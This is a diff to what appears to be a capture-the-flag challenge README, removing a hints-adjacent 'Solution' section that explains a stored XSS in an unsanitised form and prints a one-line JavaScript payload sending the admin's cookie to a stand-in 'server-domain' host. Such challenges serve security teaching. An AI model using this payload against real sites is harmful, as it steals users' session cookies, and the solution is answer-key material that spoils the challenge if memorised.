@@ -32,19 +32,3 @@ the challenge outide of the network.
 	* It's not going to run itself
 	* The admin needs redirecting
 </details>
-
-<details>
-	<summary>Solution</summary>
-
-	When the user submits the form, an "admin" will check the page.
-	The "admin" has the flag stored as a cookie.
-	The form has no sanitisation and is vulnerable to XSS
-
-	The code is a self executing function that redirects the admin to
-	the server and appends the admins cookies to the query string.
-	The server can then log the cookie containing the flag to the console.
-
-	
-	(()=>{location.href="http://server-domain/?flag=" + document.cookie})()
-	
-</details>
